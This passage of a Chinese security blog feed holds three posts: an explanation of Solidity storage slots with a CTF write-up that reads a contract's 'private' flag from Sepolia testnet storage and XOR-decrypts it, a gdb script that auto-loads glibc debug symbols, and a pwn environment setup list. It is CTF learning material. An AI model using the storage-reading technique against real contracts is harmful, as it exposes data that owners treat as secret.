<p>部署成功后底下Deployed Contracts会显示出内容，我们可以通过点击按钮来调用各个接口，有些接口的调用我们需要传参。可以发现我们的public变量也可以作为接口调用，点击storedFlag就能获取到原合约异或加密后的storedFlag的值</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005162140584.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005162816996.png"
                      class=""
                >

<p>然后我们复制一下这个自己部署的合约的地址，在编译完exp.sol后，在CONTRACT中选择exp.sol，传入刚才部署的合约地址用以接口调用。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241007174515117.png"
                      class=""
                >

<p>成功以后，用我们之前编写的getFlag外部方法，就能直接获取到我们之前部署的flag了，这样能够获取到public存储的flag密文。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241007174257776.png"
                      class=""
                >



<h3 id="6-存储层面"><a href="#6-存储层面" class="headerlink" title="6.存储层面"></a>6.存储层面</h3><p>这个感觉在ctf解题中是很重要的，感觉ctf-wiki中已经讲的很好了，这里我再整理一遍吧。</p>
<h4 id="插槽"><a href="#插槽" class="headerlink" title="插槽"></a>插槽</h4><p>以太坊数据存储会为合约的每项数据指定一个可计算的存储位置，存放在一个容量为 2^256 的超级数组中，数组中每个元素称为插槽，其初始值为 0。虽然数组容量的上限很高，但实际上存储是稀疏的，只有非零 (空值) 数据才会被真正写入存储。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 插槽式数组存储</span><br><span class="line">----------------------------------</span><br><span class="line">|               0                |     # slot 0</span><br><span class="line">----------------------------------</span><br><span class="line">|               1                |     # slot 1</span><br><span class="line">----------------------------------</span><br><span class="line">|               2                |     # slot 2</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # ...</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # 每个插槽 32 字节</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # ...</span><br><span class="line">----------------------------------</span><br><span class="line">|            2^256-1             |     # slot 2^256-1</span><br><span class="line">----------------------------------</span><br></pre></td></tr></table></figure></div>

<p>当数据长度是已知时，其具体的存储位置将在编译时指定，而对于长度不确定的类型（如动态数组、映射），则会按一定规则计算存储位置。以下是对不同类型变量的储存模型的具体分析。</p>
<h4 id="存储规则"><a href="#存储规则" class="headerlink" title="存储规则"></a>存储规则</h4><ul>
<li>存储插槽以低位对齐方式存储，在图上直观表示就是右对齐</li>
<li>每个基本类型只占存储它们所需字节</li>
<li>一个插槽内能存多个类型</li>
<li>如果存储插槽中的剩余空间不足以储存一个基本类型，那么它会被移入下一个存储插槽</li>
<li>结构和数组数据总是会占用一整个新插槽（但结构或数组中的各项，都会以这些规则进行打包）</li>
</ul>
<h5 id="一般存法"><a href="#一般存法" class="headerlink" title="一般存法"></a>一般存法</h5><p>如以下合约： </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    address a;      // 0</span><br><span class="line">    uint8 b;        // 0</span><br><span class="line">    uint256 c;      // 1</span><br><span class="line">    bytes24 d;      // 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>其存储布局如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (11) | b (1) |            a (20)           | &lt;- slot 0</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                       c (32)                      | &lt;- slot 1</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (8) |                d (24)                | &lt;- slot 2</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure></div>



<h5 id="动态数组存法"><a href="#动态数组存法" class="headerlink" title="动态数组存法"></a>动态数组存法</h5><p>会占用对应位置 <code>p</code> 处的插槽，用以储存数组的长度，而数组真正的起始点会位于 <code>keccak256(p)</code> 处</p>
<p>如以下合约： </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    uint256 a;      // 0</span><br><span class="line">    uint[] b;       // 1</span><br><span class="line">    uint256 c;      // 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>其存储布局如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">|                      a (32)                       | &lt;- slot 0</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                    b.length (32)                  | &lt;- slot 1</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                      c (32)                       | &lt;- slot 2</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                        ...                        |   ......</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                      b[0] (32)                    | &lt;- slot `keccak256(1)`</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                      b[1] (32)                    | &lt;- slot `keccak256(1) + 1`</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                        ...                        |   ......</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure></div>



<h5 id="字节数组和字符串存法"><a href="#字节数组和字符串存法" class="headerlink" title="字节数组和字符串存法"></a>字节数组和字符串存法</h5><p>如果 <code>bytes</code> 和 <code>string</code> 的数据很短，那么它们的长度也会和数据一起存储到同一个插槽。具体地说：如果数据长度小于等于 31 字节， 则它存储在高位字节（左对齐），最低位字节存储 <code>length * 2</code>。如果数据长度超出 31 字节，则在主插槽存储 <code>length * 2 + 1</code>， 数据照常存储在 <code>keccak256(slot)</code> 中。</p>
<h5 id="映射存法"><a href="#映射存法" class="headerlink" title="映射存法"></a>映射存法</h5><p>对于映射，其会占据位置 <code>p</code> 处的一个插槽，但该插槽不会被真正使用。映射中的键 <code>k</code> 所对应的值会位于 <code>keccak256(k . p)</code>， 其中 <code>.</code> 是连接符。如果该值同时是一个非基本类型，则将 <code>keccak256(k . p)</code> 作为偏移量来找到具体的位置。</p>
<p>如以下合约： </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    mapping(address =&gt; uint) a;      // 0</span><br><span class="line">    uint256 b;                       // 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>其存储布局如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">|                    reserved (a)                   | &lt;- slot 0</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                      b (32)                       | &lt;- slot 1</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                        ...                        |   ......</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                     a[addr] (32)                  | &lt;- slot `keccak256(addr . 0)`</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                        ...                        |   ......</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure></div>



<h4 id="不同类型所占字节数"><a href="#不同类型所占字节数" class="headerlink" title="不同类型所占字节数"></a>不同类型所占字节数</h4><p>X&#x3D;{8,16,24,32,40,48,56,64,128,256}	N&#x3D;{x|1&lt;&#x3D;x&lt;&#x3D;16,x&#x3D;32}</p>
<p>表中{x}代表X集合中某个元素，{n}表示N集合中某个元素，？？？为动态类型数据</p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">大小（字节）</th>
</tr>
</thead>
<tbody><tr>
<td align="center">address</td>
<td align="center">20</td>
</tr>
<tr>
<td align="center">address payable</td>
<td align="center">20</td>
</tr>
<tr>
<td align="center">bool</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">uint{x}</td>
<td align="center">{x}&#x2F;8</td>
</tr>
<tr>
<td align="center">int{x}</td>
<td align="center">{x}&#x2F;8</td>
</tr>
<tr>
<td align="center">bytes{n}</td>
<td align="center">{n}</td>
</tr>
<tr>
<td align="center">bytes（动态字节数组）</td>
<td align="center">？？？</td>
</tr>
<tr>
<td align="center">string（动态字符串）</td>
<td align="center">？？？</td>
</tr>
<tr>
<td align="center">结构体、数组、映射</td>
<td align="center">？？？</td>
</tr>
</tbody></table>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="7-题目分析"><a href="#7-题目分析" class="headerlink" title="7.题目分析"></a>7.题目分析</h3><h5 id="SHCTF-just-Signin"><a href="#SHCTF-just-Signin" class="headerlink" title="[SHCTF] just Signin"></a>[SHCTF] just Signin</h5><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005161451526.png"
                      class=""
                >

<p>先看题目提供的合约，其中有存了一个flag，然后我们可以从外部调用verifyXORedFlag来验证我们输入的flag是否正确，但显然我们不可能直接去爆破flag的值，这时候我们参考ctf-wiki中关于<code>Ethereum Storage</code>的介绍。</p>
<blockquote>
<p>由于以太坊上的所有信息都是公开的，所以即使一个变量被声明为 private，我们仍能读到变量的具体值。</p>
</blockquote>
<blockquote>
<p>利用 web3 提供的 <code>web3.eth.getStorageAt()</code> 方法，可以读取一个以太坊地址上指定位置的存储内容。所以只要计算出了一个变量对应的插槽位置，就可以通过调用该函数来获得该变量的具体值。&#96;</p>
</blockquote>
<p>那么我们就可以去用web3这个js库编写脚本来分析插槽内容。根据内存存储的规则，string类型的变量是动态分配内存的，由于存的内容大于31字节，所以该位置slot0会存大小，而keccak256(0)中会存实际内容。而且由于内容大于32字节，所以我们要连续读几个插槽，这里读两个就能读到全部内容了。</p>
<p>在写脚本过程中还遇到了几个坑：</p>
<ul>
<li>直接keccak256(0)出来的插槽位置中是全空的，实际上我们要得到的插槽位置在keccak256(abi.encodePacked(0))中，也就是在keccak256(‘0x0000000000000000000000000000000000000000000000000000000000000000’)中。</li>
<li>其中用npm装web3库时后面测试运行时会报错，原因是我拿apt装的nodejs版本较低，解决方法是拿nvm重装高版本nodejs。</li>
<li><code>const web3 = new Web3(&quot;https://sepolia.infura.io/v3/your_api&quot;);</code>这个创建实例一开始我后面的url不知道填什么，从ChainList找了几个url填进去，然后会发现对应地址处的插槽是全空的，显然是找错链了。后面在infura注册后用里面的测试网络sepolia能够正确找到对应合约。</li>
</ul>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// const Web3 = require(&#x27;web3&#x27;);</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Web3</span> <span class="keyword">from</span> <span class="string">&#x27;web3&#x27;</span>;</span><br><span class="line"><span class="comment">// 连接到 Sepolia 测试网络（你需要替换成合适的提供商 URL）</span></span><br><span class="line"><span class="keyword">const</span> web3 = <span class="keyword">new</span> <span class="title class_">Web3</span>(<span class="string">&quot;https://sepolia.infura.io/v3/your_api&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合约地址（在题目中提供的地址）</span></span><br><span class="line"><span class="keyword">const</span> contractAddress = <span class="string">&quot;0x3948DF4C50B1671eaa6b22876Ea746899a6916C1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取存储的 private 变量 storedFlag</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getPrivateVariable</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 读取存储插槽的数据</span></span><br><span class="line">        <span class="keyword">const</span> data = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contractAddress, <span class="number">0</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Stored len in slot 0:`</span>, data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> startSlot = <span class="keyword">await</span> <span class="title class_">BigInt</span>(web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span>));</span><br><span class="line">        <span class="comment">// 要读取的起始插槽</span></span><br><span class="line">        <span class="keyword">const</span> numSlots = <span class="number">2</span>; <span class="comment">// 要读取的插槽数量</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; numSlots; i++) &#123;</span><br><span class="line">            <span class="keyword">const</span> slot = startSlot + <span class="title class_">BigInt</span>(i);</span><br><span class="line">            <span class="keyword">const</span> storageData = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contractAddress, slot);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Data at slot <span class="subst">$&#123;slot&#125;</span>:`</span>, storageData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Error reading slot:`</span>, error);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">getPrivateVariable</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005142240033.png"
                      class=""
                >

<p>然后我们就能得到经过异或加密的密文，简单解密回去后就能得到flag</p>
<p>python解密exp</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">31</span>, <span class="number">6</span>, <span class="number">69</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">43</span>, <span class="number">18</span>, <span class="number">28</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">28</span>, <span class="number">85</span>, <span class="number">44</span>, <span class="number">10</span>, <span class="number">82</span>, <span class="number">27</span>, <span class="number">5</span>, <span class="number">24</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">21</span>, <span class="number">15</span>, <span class="number">29</span>, <span class="number">55</span>, <span class="number">20</span>, <span class="number">68</span>, <span class="number">20</span>, <span class="number">31</span>, <span class="number">12</span>, <span class="number">30</span>]</span><br><span class="line">key = <span class="string">&#x27;shctf&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    ch = enc[i] ^ <span class="built_in">ord</span>(key[i%<span class="number">5</span>])</span><br><span class="line">    flag += <span class="built_in">chr</span>(ch)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>BlockChain</category>
      </categories>
      <tags>
        <tag>BlockChain</tag>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>带符号调试-gdb脚本实现自动化加载</title>
    <url>/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/</url>
    <content><![CDATA[<h4 id="问题由来"><a href="#问题由来" class="headerlink" title="问题由来"></a>问题由来</h4><p>在对于堆的<code>_IO_FILE</code>利用的学习过程中，我们通常需要伪造一个fake_IO_FILE，并且附带源码调试，以方便清除是否进入了目标函数，是否一些条件判断通过。但是有时候却在pwndbg加载时找不到对应的glibc的symbol file文件，这就导致我们无法进行源码级别调试，而且看结构体只能自己一个一个字段带进去看，十分麻烦。所以这里介绍一下如何方便地进行带符号调试。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123103232492.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123103325230.png"
                      class=""
                >

<h4 id="符号文件"><a href="#符号文件" class="headerlink" title="符号文件"></a>符号文件</h4><h5 id="Build-ID"><a href="#Build-ID" class="headerlink" title="Build ID"></a>Build ID</h5><p><code>Build ID</code> 是 ELF 文件（可执行文件和共享库）中一个独特的标识符，用于标识文件的内容。它是一个不可变的标志，通常用来快速匹配文件与其调试符号或源代码。</p>
<hr>
<h6 id="主要用途"><a href="#主要用途" class="headerlink" title="主要用途"></a><strong>主要用途</strong></h6><ol>
<li><strong>唯一标识 ELF 文件</strong>：<ul>
<li>即使文件名或路径改变，<code>Build ID</code> 仍然可以唯一标识文件。</li>
<li>不同编译选项或源代码的修改会导致新的 <code>Build ID</code>。</li>
</ul>
</li>
<li><strong>关联调试符号和源代码</strong>：<ul>
<li>调试符号文件（如 <code>.debug</code> 文件）通常使用 <code>Build ID</code> 来匹配对应的 ELF 文件。</li>
</ul>
</li>
<li><strong>软件包管理和安全检查</strong>：<ul>
<li>用于确保文件未被篡改，或用于匹配特定版本的依赖项。</li>
</ul>
</li>
</ol>
<hr>
<h6 id="生成方式"><a href="#生成方式" class="headerlink" title="生成方式"></a><strong>生成方式</strong></h6><p><code>Build ID</code> 是通过对 ELF 文件的内容（如代码段和数据段）进行哈希计算生成的，具体方式取决于工具链。它通常由 <strong>编译器</strong> 或 <strong>链接器</strong> 自动生成，存储在 ELF 文件的 <code>.note.gnu.build-id</code> 段中。</p>
<h6 id="查看-ELF-文件的-Build-ID"><a href="#查看-ELF-文件的-Build-ID" class="headerlink" title="查看 ELF 文件的 Build ID"></a><strong>查看 ELF 文件的 Build ID</strong></h6><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">1.readelf -n /path/to/file | grep &#x27;Build ID&#x27;</span><br><span class="line">2.file /path/to/file</span><br></pre></td></tr></table></figure></div>

<h5 id="debug"><a href="#debug" class="headerlink" title=".debug"></a>.debug</h5><p>通常<code>symbol file</code>会在一个<code>.debug/.build-id/xx/</code>的目录下，这里在<code>build-id</code>中会有一堆2位16进制数构成的目录名，实际在.debug文件检索时，会先根据<code>build-id</code>的第一个字节（最高位）来进入对应前缀的文件夹，然后在该目录下找对应的.debug文件。比如我们的<code>build-id</code>为<code>89c3cb85f9e55046776471fed05ec441581d1969</code>，那么我们目标的.debug文件就在<code>.debug/.build-id/89/c3cb85f9e55046776471fed05ec441581d1969.debug</code>这个位置。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123105018012.png"
                      class=""
                >



<h4 id="手动加载符号文件"><a href="#手动加载符号文件" class="headerlink" title="手动加载符号文件"></a>手动加载符号文件</h4><p>一般来说，我们用<code>glibc-all-in-one</code>下载到的glibc都是连带着<code>.debug</code>一起下的，但我们pwndbg会找不到目标的符号文件。我们可以直接在gdb中用<code>add-symbol-file /path/to/.debug</code>来读取符号信息。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123105847709.png"
                      class=""
                >

<p>或者也可以在<code>~/.gdbinit</code>中加一个<code>set debug-file-directory /path/to/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/.debug/</code>，然后进入gdb时就会自动检索到<code>.debug</code>文件，附加调试符号信息。</p>
<h4 id="自动化进行附加符号文件"><a href="#自动化进行附加符号文件" class="headerlink" title="自动化进行附加符号文件"></a>自动化进行附加符号文件</h4><p>既然我们已经知道了手动附加的原理，这里我们就可以尝试使用脚本进行自动化附加。这里我们选择用gdb中的<code>info proc mappings</code>命令来获取libc的基址以及路径，后续.debug文件路径的判断也是基于此。所以我们想要附加生效，就要链接到glibc-all-in-one中的libc。</p>
<p>在gdbinit中加入如下命令，这里使用了<code>gdb.events.stop.connect</code>来使gdb在停下来的时候调用函数进行加载<code>symbol file</code>，这是因为gdb.attach(p)时，<code>.gdbinit</code>是先加载后再把gdb附加到进程的，如果直接调用会报错。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">DEBUG_FILE_DIR = <span class="string">&quot;/home/collectcrop/glibc_run/glibc-all-in-one/libs&quot;</span></span><br><span class="line">symbols_loaded = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_build_id</span>(<span class="params">lib_path</span>):</span><br><span class="line">    <span class="comment">#从给定的库路径提取 build-id</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">	<span class="comment">#用外部命令获取build id</span></span><br><span class="line">        res = subprocess.check_output(</span><br><span class="line">            <span class="string">f&quot;readelf -n <span class="subst">&#123;lib_path&#125;</span> | grep &#x27;Build ID&#x27;&quot;</span>, </span><br><span class="line">            shell=<span class="literal">True</span>, </span><br><span class="line">            text=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 提取 Build ID 字符串</span></span><br><span class="line">        build_id = res[res.find(<span class="string">&#x27;:&#x27;</span>)+<span class="number">2</span>:]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Build ID: <span class="subst">&#123;build_id&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> build_id</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> gdb.error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Error extracting build-id for <span class="subst">&#123;lib_path&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_debug_symbols</span>():</span><br><span class="line">    <span class="keyword">global</span> symbols_loaded</span><br><span class="line">    mappings = gdb.execute(<span class="string">&quot;info proc mappings&quot;</span>, to_string=<span class="literal">True</span>).splitlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> mappings:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;/libc.so&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            parts = line.split()</span><br><span class="line">            libc_path = parts[-<span class="number">1</span>]</span><br><span class="line">            libc_base = parts[<span class="number">0</span>]</span><br><span class="line">            build_id = get_build_id(libc_path)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> build_id:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Could not determine Build ID for libc.&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line">            DEBUG_FILE_DIR = libc_path.replace(<span class="string">&quot;/libc.so.6&quot;</span>, <span class="string">&quot;/.debug/.build-id&quot;</span>)</span><br><span class="line">            <span class="comment"># 解析 .debug 文件路径</span></span><br><span class="line">            debug_file_path = os.path.join(</span><br><span class="line">                DEBUG_FILE_DIR,</span><br><span class="line">                build_id[:<span class="number">2</span>],</span><br><span class="line">                build_id[<span class="number">2</span>:].replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>) + <span class="string">&quot;.debug&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] debug file: <span class="subst">&#123;debug_file_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(DEBUG_FILE_DIR):</span><br><span class="line">                <span class="keyword">if</span> os.path.exists(debug_file_path):</span><br><span class="line">                    gdb.execute(<span class="string">f&quot;add-symbol-file <span class="subst">&#123;debug_file_path&#125;</span> <span class="subst">&#123;libc_base&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] Loaded symbols for <span class="subst">&#123;libc_path&#125;</span> from <span class="subst">&#123;debug_file_path&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[-] Debug file not found: <span class="subst">&#123;debug_file_path&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] Build ID directory not found: <span class="subst">&#123;DEBUG_FILE_DIR&#125;</span>&quot;</span>)</span><br><span class="line">            symbols_loaded = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 延迟加载符号，确保附加到进程后运行</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_stop</span>(<span class="params">event</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> symbols_loaded:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Target process stopped. Attempting to load symbols...&quot;</span>)</span><br><span class="line">        load_debug_symbols()</span><br><span class="line"></span><br><span class="line">gdb.events.stop.connect(on_stop)</span><br><span class="line">end</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>然后就能愉快地调试了，好耶。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123121652093.png"
                      class=""
                >



<h4 id="一般换库步骤"><a href="#一般换库步骤" class="headerlink" title="一般换库步骤"></a>一般换库步骤</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">strings ./libc.so.6  | grep &#x27;GNU&#x27;		#看给的libc版本</span><br><span class="line">ldd ./binary							#看程序动态链接库的情况</span><br><span class="line">patchelf --replace-needed original_libc target_libc ./binary	#换libc，original_libc由上面ldd能看到</span><br><span class="line">patchelf --set-interpreter target_ld ./binary					#换ld</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>debug</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>gdb</tag>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title>快速在24.04Ubuntu搭建pwn环境</title>
    <url>/blog/2025/01/24/%E5%BF%AB%E9%80%9F%E5%9C%A824-04Ubuntu%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h2 id="快速在24-04Ubuntu搭建pwn环境"><a href="#快速在24-04Ubuntu搭建pwn环境" class="headerlink" title="快速在24.04Ubuntu搭建pwn环境"></a>快速在24.04Ubuntu搭建pwn环境</h2><p>打了重庆市赛时，3个pwn题有2个给了2.39glibc，据有些大师傅们说，2.39的glibc只能在24.04的Ubuntu上兼容，我也试了试用<code>glibc-all-in-one</code>，下2.39的glibc，但是下下来是空的。这说明原先22.04Ubuntu的环境已经不够用了，需要新建一个24.04版本的Ubuntu虚拟机来应对各种可能的做题环境。这里顺便记录下快速起pwn环境的步骤。</p>
<h3 id="安装清单"><a href="#安装清单" class="headerlink" title="安装清单"></a>安装清单</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwntools</span><br><span class="line">ROPgadget</span><br><span class="line">seccomp-tools</span><br><span class="line">glibc-all-in-one</span><br><span class="line">patchelf</span><br><span class="line">pwndbg</span><br><span class="line">one_gadget</span><br></pre></td></tr></table></figure></div>



